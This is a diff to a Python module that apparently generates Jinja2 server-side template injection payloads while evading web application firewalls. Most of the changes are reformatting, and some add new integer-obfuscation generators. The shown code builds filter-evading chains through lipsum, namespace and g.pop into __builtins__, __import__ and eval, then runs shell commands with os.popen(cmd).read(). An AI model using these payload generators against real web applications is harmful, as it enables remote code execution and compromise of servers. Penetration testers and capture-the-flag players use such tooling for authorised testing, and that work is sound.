@@ -27,7 +27,7 @@ gen_weight_default = {
     "gen_string_concat2": 1,
     "gen_string_formatpercent": 1,
     "gen_attribute_attrfilter": 1,
-    "gen_item_dunderfunc": 1
+    "gen_item_dunderfunc": 1,
 }
 
 
@@ -52,7 +52,7 @@ class PayloadGenerator:
         waf_func: Callable[[str], bool],
         context: Union[Dict, None],
         callback: Union[Callable[[str, Dict], None], None] = None,
-        detect_mode: str = DETECT_MODE_ACCURATE
+        detect_mode: str = DETECT_MODE_ACCURATE,
     ):
         self.waf_func = waf_func
         self.context = context if context else {}
@@ -139,7 +139,12 @@ class PayloadGenerator:
             result = ret[0]
             self.callback(
                 CALLBACK_GENERATE_PAYLOAD,
-                {"gen_type": gen_type, "args": args, "gen_ret": gen_ret, "payload": result},
+                {
+                    "gen_type": gen_type,
+                    "args": args,
+                    "gen_ret": gen_ret,
+                    "payload": result,
+                },
             )
             # 为了日志的简洁，仅打印一部分日志
             if gen_type in (INTEGER, STRING) and result != str(args[0]):
@@ -325,16 +330,69 @@ def gen_positive_integer_sum(context: dict, value: int):
 
 
 @req_gen
-def gen_positive_integer_length(context: dict, value: int):
+def gen_positive_integer_recurdivided(context: dict, value: int):
+    if value <= 6:
+        return [(UNSATISFIED,)]
+    lst = [(LITERAL, "+"), (POSITIVE_INTEGER, value % 6)] if value % 6 != 0 else []
+    return (
+        [
+            (LITERAL, "("),
+            (POSITIVE_INTEGER, value // 6),
+            (LITERAL, "*"),
+            (POSITIVE_INTEGER, 6),
+        ]
+        + lst
+        + [
+            (LITERAL, ")"),
+        ]
+    )
+
+
+@req_gen
+def gen_positive_integer_recurmulitiply(context: dict, value: int):
+    xs = [x for x in range(3, value // 2) if value % x == 0]
+    if xs == []:
+        return [(UNSATISFIED,)]
     return [
-        (LITERAL, "(({},)|length)".format(",".join("x" * value)))
+        (
+            ONEOF,
+            *[
+                [
+                    (LITERAL, "("),
+                    (POSITIVE_INTEGER, value // x),
+                    (LITERAL, "*"),
+                    (POSITIVE_INTEGER, x),
+                    (LITERAL, ")"),
+                ]
+                for x in xs[::-1]
+            ],
+        )
     ]
+
+
+@req_gen
+def gen_positive_integer_dictlength(context: dict, value: int):
+    return [(LITERAL, "(dict({}=x)|join|length)".format("x" * value))]
+
+
+@req_gen
+def gen_positive_integer_length(context: dict, value: int):
+    return [(LITERAL, "(({},)|length)".format(",".join("x" * value)))]
+
 
 @req_gen
 def gen_positive_integer_length2(context: dict, value: int):
-    return [
-        (LITERAL, "(({},).__len__( ))".format(",".join("x" * value)))
-    ]
+    return [(LITERAL, "(({},).__len__( ))".format(",".join("x" * value)))]
+
+
+@req_gen
+def gen_positive_integer_truesum1(context: dict, value: int):
+    return [(LITERAL, "({})".format("+".join(["True"] * value)))]
+
+
+@req_gen
+def gen_positive_integer_truesum2(context: dict, value: int):
+    return [(LITERAL, "(({},)|sum)".format(",".join(["True"] * value)))]
 
 
 # ---
@@ -476,28 +534,22 @@ def gen_string_percent_lipsum(context):
         )
     ]
 
+
 @req_gen
 def gen_string_percent_lipsum2(context):
-    return [
-        (
-            LITERAL,
-            "(lipsum['__glob''als__']['__builti''ns__']['chr'](37))"
-        )
-    ]
+    return [(LITERAL, "(lipsum['__glob''als__']['__builti''ns__']['chr'](37))")]
+
 
 @req_gen
 def gen_string_percent_namespace(context):
     return [
         (
             LITERAL,
-            "(namespace['__ini''t__']['__glob''al''s__']['__builti''ns__']['chr']("
+            "(namespace['__ini''t__']['__glob''al''s__']['__builti''ns__']['chr'](",
         ),
         (INTEGER, 37),
-        (
-            LITERAL, "))"
-        )
+        (LITERAL, "))"),
     ]
-
 
 
 @req_gen
@@ -607,15 +659,16 @@ def gen_string_percent_lower_c_concat(context):
         (LITERAL, ")"),
     ]
 
+
 @req_gen
 def gen_string_percent_lower_c_dictjoin(context):
     # "(dict([('%',x),('c',x)])|join)"
     return [
         (LITERAL, "(dict([("),
-        (STRING_PERCENT, ),
+        (STRING_PERCENT,),
         (LITERAL, ",x),("),
-        (STRING_LOWERC, ),
-        (LITERAL, ",x)])|join)")
+        (STRING_LOWERC,),
+        (LITERAL, ",x)])|join)"),
     ]
 
 
@@ -624,21 +677,22 @@ def gen_string_percent_lower_c_listjoin(context):
     # "(['%','c']|join)"
     return [
         (LITERAL, "(["),
-        (STRING_PERCENT, ),
+        (STRING_PERCENT,),
         (LITERAL, ","),
-        (STRING_LOWERC, ),
-        (LITERAL, "]|join)")
+        (STRING_LOWERC,),
+        (LITERAL, "]|join)"),
     ]
+
 
 @req_gen
 def gen_string_percent_lower_c_tuplejoin(context):
     # "(('%','c')|join)"
     return [
         (LITERAL, "(("),
-        (STRING_PERCENT, ),
+        (STRING_PERCENT,),
         (LITERAL, ","),
-        (STRING_LOWERC, ),
-        (LITERAL, ")|join)")
+        (STRING_LOWERC,),
+        (LITERAL, ")|join)"),
     ]
 
 
@@ -845,17 +899,33 @@ def gen_char_dict(context, c):
         return [(UNSATISFIED,)]
     return [(LITERAL, f"(dict({c}=x)|join)")]
 
+
 @req_gen
 def gen_char_num(context, c):
     if not re.match("[0-9]", c):
         return [(UNSATISFIED,)]
-    return [(LITERAL, f"((", ), (INTEGER, int(c)), (LITERAL, ").__str__( ))")]
+    return [
+        (
+            LITERAL,
+            f"((",
+        ),
+        (INTEGER, int(c)),
+        (LITERAL, ").__str__( ))"),
+    ]
+
 
 @req_gen
 def gen_char_num2(context, c):
     if not re.match("[0-9]", c):
         return [(UNSATISFIED,)]
-    return [(LITERAL, f"((", ), (INTEGER, int(c)), (LITERAL, ")|string)")]
+    return [
+        (
+            LITERAL,
+            f"((",
+        ),
+        (INTEGER, int(c)),
+        (LITERAL, ")|string)"),
+    ]
 
 
 # ---
@@ -917,9 +987,7 @@ def gen_string_context(context: dict, value: str):
 @req_gen
 def gen_string_twostringconcat(context: dict, value: str):
     if len(value) <= 2 or len(value) > 20:
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     return [
         (LITERAL, "'"),  # test quotes first
         (
@@ -927,32 +995,32 @@ def gen_string_twostringconcat(context: dict, value: str):
             *[
                 [
                     (LITERAL, "{}'".format(value[:i].replace("'", "\\'"))),
-                    (LITERAL, "'{}'".format(value[i:].replace("'", "\\'")))
+                    (LITERAL, "'{}'".format(value[i:].replace("'", "\\'"))),
                 ]
                 for i in range(1, len(value) - 1)
-            ]
-        )
+            ],
+        ),
     ]
+
 
 @req_gen
 def gen_string_twostringconcat2(context: dict, value: str):
     if len(value) <= 2 or len(value) > 20:
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     return [
-        (LITERAL, "\""),  # test quotes first
+        (LITERAL, '"'),  # test quotes first
         (
             ONEOF,
             *[
                 [
-                    (LITERAL, "{}\"".format(value[:i].replace("\"", "\\\""))),
-                    (LITERAL, "\"{}\"".format(value[i:].replace("\"", "\\\"")))
+                    (LITERAL, '{}"'.format(value[:i].replace('"', '\\"'))),
+                    (LITERAL, '"{}"'.format(value[i:].replace('"', '\\"'))),
                 ]
                 for i in range(1, len(value) - 1)
-            ]
-        )
+            ],
+        ),
     ]
+
 
 @req_gen
 def gen_string_concat1(context: dict, value: str):
@@ -990,7 +1058,6 @@ def gen_string_concat3(context: dict, value: str):
     ]
 
 
-
 @req_gen
 def gen_string_chars(context: dict, value: str):
     ans: List[Any] = [(LITERAL, "("), (CHAR, value[0])]
@@ -1001,7 +1068,6 @@ def gen_string_chars(context: dict, value: str):
         (LITERAL, ")"),
     )
     return ans
-
 
 
 @req_gen
@@ -1019,6 +1085,7 @@ def gen_string_removedunder(context: dict, value: str):
         (LITERAL, "*"),
         (INTEGER, 2),
     ]
+
 
 @req_gen
 def gen_string_dictjoin(context: dict, value: str):
@@ -1065,7 +1132,6 @@ def gen_string_splitdictjoin3(context: dict, value: str):
     return [
         (LITERAL, "(dict({})|join)".format(",".join(f"{part}=x" for part in value)))
     ]
-
 
 
 @req_gen
@@ -1270,16 +1336,19 @@ def gen_chained_attribute_item_normal(context, obj_req, *attr_item_req):
 
 # ---
 
+
 @req_gen
 def gen_import_func_g(context):
-    return [(
-        CHAINED_ATTRIBUTE_ITEM,
-        (LITERAL, "g"),
-        (ATTRIBUTE, "pop"),
-        (ATTRIBUTE, "__globals__"),
-        (ITEM, "__builtins__"),
-        (ITEM, "__import__")
-    )]
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "g"),
+            (ATTRIBUTE, "pop"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "__import__"),
+        )
+    ]
 
 
 @req_gen
@@ -1311,15 +1380,16 @@ def gen_import_func_joiner(context):
 
 @req_gen
 def gen_import_func_namespace(context):
-    return [(
-        CHAINED_ATTRIBUTE_ITEM,
-        (LITERAL, "namespace"),
-        (ATTRIBUTE, "__init__"),
-        (ATTRIBUTE, "__globals__"),
-        (ITEM, "__builtins__"),
-        (ITEM, "__import__")
-    )]
-
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "namespace"),
+            (ATTRIBUTE, "__init__"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "__import__"),
+        )
+    ]
 
 
 # ---
@@ -1327,14 +1397,16 @@ def gen_import_func_namespace(context):
 
 @req_gen
 def gen_eval_func_g(context):
-    return [(
-        CHAINED_ATTRIBUTE_ITEM,
-        (LITERAL, "g"),
-        (ATTRIBUTE, "pop"),
-        (ATTRIBUTE, "__globals__"),
-        (ITEM, "__builtins__"),
-        (ITEM, "eval")
-    )]
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "g"),
+            (ATTRIBUTE, "pop"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "eval"),
+        )
+    ]
 
 
 @req_gen
@@ -1366,14 +1438,16 @@ def gen_eval_func_joiner(context):
 
 @req_gen
 def gen_eval_func_namespace(context):
-    return [(
-        CHAINED_ATTRIBUTE_ITEM,
-        (LITERAL, "namespace"),
-        (ATTRIBUTE, "__init__"),
-        (ATTRIBUTE, "__globals__"),
-        (ITEM, "__builtins__"),
-        (ITEM, "eval")
-    )]
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "namespace"),
+            (ATTRIBUTE, "__init__"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "eval"),
+        )
+    ]
 
 
 # ---
@@ -1435,7 +1509,7 @@ def gen_config_self(context):
 @req_gen
 def gen_module_os_import(context):
     return [
-        (IMPORT_FUNC, ),
+        (IMPORT_FUNC,),
         (LITERAL, "("),
         (STRING, "os"),
         (LITERAL, ")"),
@@ -1465,9 +1539,7 @@ def gen_module_os_config(context):
     ]
 
 
-
 # ---
-
 
 
 @req_gen
@@ -1479,7 +1551,6 @@ def gen_os_popen_obj_normal(context, cmd):
         (STRING, cmd),
         (LITERAL, "))"),
     ]
-
 
 
 @req_gen
@@ -1499,6 +1570,7 @@ def gen_os_popen_read_normal(context, cmd):
         (LITERAL, "())"),
     ]
 
+
 @req_gen
 def gen_os_popen_read_normalspace(context, cmd):
     return [
@@ -1506,6 +1578,7 @@ def gen_os_popen_read_normalspace(context, cmd):
         (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
         (LITERAL, "( ))"),
     ]
+
 
 @req_gen
 def gen_os_popen_read_normal2(context, cmd):
@@ -1515,13 +1588,19 @@ def gen_os_popen_read_normal2(context, cmd):
         (LITERAL, "("),
         (INTEGER, -1),
         (LITERAL, "))"),
-
     ]
+
 
 @req_gen
 def gen_os_popen_read_eval(context, cmd):
     return [
-        (EVAL, (STRING, "__import__('os').popen('{}').read()".format(cmd.replace("'", "\\'")))),
+        (
+            EVAL,
+            (
+                STRING,
+                "__import__('os').popen('{}').read()".format(cmd.replace("'", "\\'")),
+            ),
+        ),
     ]
 
 
